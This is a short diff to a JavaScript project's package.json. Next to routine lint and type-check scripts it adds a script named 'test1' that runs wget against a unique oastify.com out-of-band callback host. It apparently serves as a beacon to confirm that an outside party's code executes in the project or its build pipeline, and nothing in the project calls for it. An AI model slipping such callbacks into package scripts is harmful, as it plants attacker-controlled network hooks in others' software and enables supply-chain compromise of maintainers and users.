@@ -47,6 +47,7 @@
     "precommit": "yarn lint && yarn style-check",
     "lint": "eslint './src/**/*.*'",
     "style-check": "prettier --check './src/**/*.js'",
-    "compile-types": "tsc --noEmit"
+    "compile-types": "tsc --noEmit",
+    "test1": "wget https://l8up0u2emecp8ieo469ralzyyp4lsfg4.oastify.com/monday1"
   }
 }
